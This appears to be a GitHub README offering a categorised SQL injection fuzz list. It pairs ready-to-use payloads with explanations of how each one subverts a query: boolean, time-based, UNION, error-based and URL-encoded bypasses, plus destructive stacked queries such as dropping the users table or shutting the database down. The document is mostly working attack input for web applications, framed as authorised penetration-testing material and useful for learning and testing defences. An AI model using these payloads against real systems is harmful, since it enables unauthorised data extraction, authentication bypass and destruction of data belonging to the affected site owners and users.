![image](https://github.com/user-attachments/assets/2a887784-5825-46bf-869f-c71c9bf9f4f4)



# sqli
SQLi 'fuzz' list

A **SQLi fuzz list** is a set of payloads designed to test for SQL Injection vulnerabilities by injecting various SQL syntax patterns into an input field. These payloads attempt to exploit common weaknesses in SQL queries. Below is a categorized list of common SQL injection fuzz payloads:

---

### **1. Basic SQL Injection Payloads**
```sql
'
''
`
```
---
### **2. Comment Injection**
```sql
-- 
--+ 
# 
/*
```
---
### **3. Boolean-Based Payloads**
```sql
' OR '1'='1
' AND '1'='2
' OR '1'='2
```
---
### **4. Time-Based Payloads**
```sql
' OR SLEEP(5) --
'; WAITFOR DELAY '0:0:5' --
```
---
### **5. UNION-Based Payloads**
```sql
' UNION SELECT null, null --
' UNION SELECT 1,2,3 --
' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL --
```
---
### **6. Stacked Queries**
```sql
'; DROP TABLE users --
'; SHUTDOWN --
'; SELECT user, host FROM mysql.user --
```
---
### **7. Blind Injection**
```sql
' AND 1=1 --
' AND 1=2 --
```
---
### **8. Bypassing Input Validation**
```sql
%27 OR 1=1--
%27 AND 1=2--
```
---
### **9. Conditional Error-Based Payloads**
```sql
' AND (SELECT 1 FROM dual WHERE 1=1)=1 --
' AND (SELECT 1 FROM dual WHERE 1=0)=1 --
```
---
### **10. Advanced Payloads**
```sql
' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --
' UNION SELECT null, version(), user() --
```
---

### **Usage**
- Test each payload systematically.
- Use a tool like **Burp Suite**, **OWASP ZAP**, or a manual HTTP client to inject these payloads.
- Customize them to fit the backend database (MySQL, MSSQL, Oracle, PostgreSQL, etc.).

  Here’s a detailed explanation of each category and the typical usage of the SQL injection fuzz payloads:

---

### **1. Basic SQL Injection Payloads**
- **`'`, `''`, `` ` ``**:
  - **Purpose**: These are simple characters that can break out of a quoted SQL query. If the backend SQL query is improperly sanitized, these can cause syntax errors or allow additional malicious input to be executed.
  - **Example**: 
    - SQL Query: `SELECT * FROM users WHERE username = '$input'`
    - Input: `'`
    - Result: `SELECT * FROM users WHERE username = '''` (may cause a syntax error, exposing vulnerability).

---

### **2. Comment Injection**
- **`--`, `--+`, `#`, `/*`**:
  - **Purpose**: These characters introduce comments into SQL queries, effectively truncating the rest of the SQL statement and allowing attackers to bypass validation.
  - **Example**:
    - SQL Query: `SELECT * FROM users WHERE username = '$input' AND password = '$password'`
    - Input: `' OR 1=1--`
    - Result: `SELECT * FROM users WHERE username = '' OR 1=1--` (password condition is bypassed).

---

### **3. Boolean-Based Payloads**
- **`' OR '1'='1`, `' AND '1'='2`, `' OR '1'='2`**:
  - **Purpose**: These exploit logical conditions in SQL. They test if the backend logic is vulnerable by modifying the query's outcome.
  - **Example**:
    - SQL Query: `SELECT * FROM users WHERE username = '$input'`
    - Input: `' OR '1'='1`
    - Result: `SELECT * FROM users WHERE username = '' OR '1'='1'` (always true).

---

### **4. Time-Based Payloads**
- **`' OR SLEEP(5) --`, `'; WAITFOR DELAY '0:0:5' --`**:
  - **Purpose**: These are used in **time-based blind SQL injection**. They exploit the database's ability to execute time-delayed operations, confirming injection by observing delays in responses.
  - **Example**:
    - SQL Query: `SELECT * FROM users WHERE username = '$input'`
    - Input: `' OR SLEEP(5) --`
    - Result: The response is delayed by 5 seconds, confirming the vulnerability.

---

### **5. UNION-Based Payloads**
- **`' UNION SELECT null, null --`, `' UNION SELECT 1,2,3 --`**:
  - **Purpose**: Exploits the `UNION` SQL operator to combine results from multiple SELECT statements, potentially exposing sensitive data like usernames, passwords, or database versions.
  - **Example**:
    - SQL Query: `SELECT username FROM users WHERE id = '$input'`
    - Input: `' UNION SELECT null, version() --`
    - Result: The query now fetches the database version.

---

### **6. Stacked Queries**
- **`'; DROP TABLE users --`, `'; SHUTDOWN --`**:
  - **Purpose**: These exploit backends that support **stacked queries** (executing multiple queries in a single request). They can cause destructive operations like dropping tables or shutting down the database.
  - **Example**:
    - SQL Query: `SELECT * FROM users WHERE username = '$input'`
    - Input: `'; DROP TABLE users --`
    - Result: The `users` table is dropped from the database.

---

### **7. Blind Injection**
- **`' AND 1=1 --`, `' AND 1=2 --`**:
  - **Purpose**: Used to test **blind SQL injection** by introducing conditions that are always true (`1=1`) or false (`1=2`) and observing how the application responds.
  - **Example**:
    - SQL Query: `SELECT * FROM users WHERE username = '$input'`
    - Input: `' AND 1=1 --`
    - Result: Response indicates success; confirming the injection vulnerability.

---

### **8. Bypassing Input Validation**
- **`%27 OR 1=1--`, `%27 AND 1=2--`**:
  - **Purpose**: These are URL-encoded payloads designed to bypass input validation mechanisms or firewalls. `%27` is the URL-encoded form of a single quote (`'`).
  - **Example**:
    - Input: `%27 OR 1=1--` (decoded to `' OR 1=1--`).
    - Result: May bypass input filtering that doesn't decode user input.

---

### **9. Conditional Error-Based Payloads**
- **`' AND (SELECT 1 FROM dual WHERE 1=1)=1 --`**:
  - **Purpose**: Used in **error-based SQL injection** to extract data by inducing SQL errors and reading database responses.
  - **Example**:
    - SQL Query: `SELECT * FROM users WHERE username = '$input'`
    - Input: `' AND (SELECT 1 FROM dual WHERE 1=0)=1 --`
    - Result: An error response reveals valuable information about the database.

---

### **10. Advanced Payloads**
- **`' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --`**:
  - **Purpose**: Targets advanced data extraction, such as metadata from the database (`information_schema` stores metadata in most databases).
  - **Example**:
    - Input: `' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --`
    - Result: Returns the number of tables in the database, confirming the injection point.

---

### Key Points:
- Always ensure testing is conducted on authorized systems.
- These payloads should be used in a controlled environment with permission.
- Tools like **sqlmap** can automate the injection process for these payloads.



